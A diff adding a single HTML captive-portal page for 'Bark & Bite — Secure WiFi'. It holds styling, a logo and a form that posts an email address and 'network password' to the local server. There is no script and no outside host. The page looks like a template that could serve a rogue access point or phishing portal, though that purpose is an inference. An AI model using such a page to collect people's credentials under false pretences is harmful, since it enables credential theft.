@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bark &amp; Bite — Secure WiFi</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: Inter, 'Segoe UI', Arial, sans-serif;
+    background: #0F0D0B;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+  }
+  .card {
+    background: #1A1714;
+    width: 100%;
+    max-width: 400px;
+    border-radius: 10px;
+    border: 1px solid #3D342966;
+    box-shadow: 0 0 40px #E0931318, 0 8px 32px rgba(0,0,0,0.6);
+    overflow: hidden;
+  }
+  .topbar {
+    height: 3px;
+    background: linear-gradient(90deg, #E09313, #F5A623, #E09313);
+  }
+  .hero {
+    padding: 28px 24px 18px;
+    text-align: center;
+    border-bottom: 1px solid #3D342944;
+  }
+  .logo-wrap {
+    width: 64px; height: 64px;
+    margin: 0 auto 12px;
+    background: #0F0D0B;
+    border-radius: 50%;
+    border: 2px solid #E09313;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 0 20px #E0931333;
+  }
+  .logo-wrap svg { width: 38px; height: 38px; }
+  .brand {
+    font-size: 20px;
+    font-weight: 800;
+    color: #ECE0D1;
+    letter-spacing: 1px;
+  }
+  .brand span { color: #E09313; }
+  .brand-sub {
+    font-family: 'Courier New', monospace;
+    font-size: 10px;
+    color: #E0931399;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-top: 4px;
+  }
+  .status {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    margin-top: 10px;
+    font-size: 11px;
+    color: #22c55e;
+    font-family: 'Courier New', monospace;
+    letter-spacing: 1px;
+  }
+  .dot {
+    width: 6px; height: 6px;
+    background: #22c55e;
+    border-radius: 50%;
+    animation: pulse 2s ease infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+  .body { padding: 22px 24px 18px; }
+  .notice {
+    background: #E093130D;
+    border: 1px solid #E0931333;
+    border-radius: 6px;
+    padding: 10px 14px;
+    font-size: 12px;
+    color: #E09313CC;
+    margin-bottom: 20px;
+    line-height: 1.5;
+    font-family: 'Courier New', monospace;
+  }
+  label {
+    display: block;
+    font-size: 11px;
+    color: #8C8070;
+    font-weight: 600;
+    margin-bottom: 5px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  input[type=email], input[type=password] {
+    width: 100%;
+    padding: 11px 14px;
+    border: 1px solid #3D3429;
+    border-radius: 6px;
+    font-size: 14px;
+    margin-bottom: 14px;
+    outline: none;
+    color: #ECE0D1;
+    background: #0F0D0B;
+    font-family: Inter, sans-serif;
+  }
+  input:focus { border-color: #E09313; box-shadow: 0 0 0 3px #E093131A; }
+  input::placeholder { color: #5A5044; }
+  .checkbox-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 18px;
+  }
+  .checkbox-row input[type=checkbox] {
+    width: 16px; height: 16px;
+    accent-color: #E09313;
+  }
+  .checkbox-row label {
+    font-size: 12px;
+    color: #8C8070;
+    font-weight: normal;
+    text-transform: none;
+    letter-spacing: 0;
+    margin-bottom: 0;
+  }
+  .btn {
+    width: 100%;
+    background: linear-gradient(135deg, #E09313, #F5A623);
+    color: #0F0D0B;
+    border: none;
+    padding: 12px;
+    font-size: 14px;
+    font-weight: 700;
+    border-radius: 6px;
+    cursor: pointer;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+  }
+  .btn:hover { opacity: 0.9; }
+  .footer {
+    padding: 14px 24px;
+    font-size: 10px;
+    color: #5A5044;
+    text-align: center;
+    border-top: 1px solid #3D342944;
+    font-family: 'Courier New', monospace;
+    letter-spacing: 0.5px;
+    line-height: 1.6;
+  }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="topbar"></div>
+  <div class="hero">
+    <div class="logo-wrap">
+      <svg viewBox="0 0 40 40" fill="none">
+        <path d="M20 4 L12 14 L8 12 L10 22 L6 28 L14 26 L18 36 L20 30 L22 36 L26 26 L34 28 L30 22 L32 12 L28 14 L20 4Z" fill="#E09313" opacity="0.9"/>
+        <circle cx="16" cy="18" r="2" fill="#0F0D0B"/>
+        <circle cx="24" cy="18" r="2" fill="#0F0D0B"/>
+        <path d="M17 24 Q20 27 23 24" stroke="#0F0D0B" stroke-width="1.5" fill="none" stroke-linecap="round"/>
+      </svg>
+    </div>
+    <div class="brand">BARK <span>&amp;</span> BITE</div>
+    <div class="brand-sub">Secure Network</div>
+    <div class="status"><div class="dot"></div> SYSTEM OPERATIONAL</div>
+  </div>
+  <div class="body">
+    <div class="notice">&#9888; Authentication required. Connect to continue browsing.</div>
+    <form method="POST" action="/">
+      <label for="email">Email Address</label>
+      <input type="email" id="email" name="email" placeholder="you@company.com" autocomplete="email">
+
+      <label for="password">Network Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter access code" autocomplete="current-password">
+
+      <div class="checkbox-row">
+        <input type="checkbox" id="terms" name="terms" value="yes" checked>
+        <label for="terms">I accept the acceptable use policy</label>
+      </div>
+
+      <button type="submit" class="btn">Authenticate &#8594;</button>
+    </form>
+  </div>
+  <div class="footer">
+    &copy; 2026 Bark &amp; Bite Tactical. All sessions monitored.<br>
+    Unauthorized access is prohibited and will be prosecuted.
+  </div>
+</div>
+</body>
+</html>
